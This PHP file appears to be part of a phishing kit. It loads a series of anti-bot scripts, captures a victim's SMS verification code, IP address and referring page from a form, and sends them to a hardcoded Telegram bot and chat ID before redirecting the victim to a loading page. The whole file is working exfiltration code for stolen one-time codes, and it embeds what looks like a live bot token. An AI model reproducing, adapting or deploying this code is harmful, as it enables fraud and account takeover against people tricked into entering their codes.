<?php
include 'src/antibots.php';
include 'antibots.php';
include 'anti/anti1.php';
include 'anti/anti2.php';
include 'anti/anti3.php';
include 'anti/anti4.php';
include 'anti/anti5.php';
include 'anti/anti6.php';
include 'anti/anti7.php';
include 'anti/anti8.php';
// Configuration
$botToken = "7726379618:AAEKmunbiAyZSH5Rs-oiTdPUHM6p1Xa6Bb4";
$chatId = "8134069302";

// Récupérer l'adresse IP du visiteur
$ip = $_SERVER['REMOTE_ADDR'];
$page = basename($_SERVER['HTTP_REFERER']); // page précédente
$date = date("Y-m-d H:i:s");

// Récupérer les données du formulaire
$sms_code = isset($_POST['sms_code']) ? htmlspecialchars($_POST['sms_code']) : 'Non spécifié';
$validation_frequency = isset($_POST['validation_frequency']) ? htmlspecialchars($_POST['validation_frequency']) : 'Non spécifié';

// Construire le message
$message = "📲 *Code SMS reçu*\n\n";
$message .= "🔑 Code : `$sms_code`\n";
$message .= "🕓 Fréquence : $validation_frequency\n";
$message .= "🌐 IP : $ip\n";
$message .= "📄 Page : $page\n";
$message .= "🕰️ Date : $date";

// URL pour envoyer le message
$sendMessageUrl = "https://api.telegram.org/bot$botToken/sendMessage";

// Paramètres à envoyer
$params = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'Markdown'
];

// Envoi du message avec file_get_contents
file_get_contents($sendMessageUrl . '?' . http_build_query($params));

// Redirection
header("Location: ../loading.php");
exit;
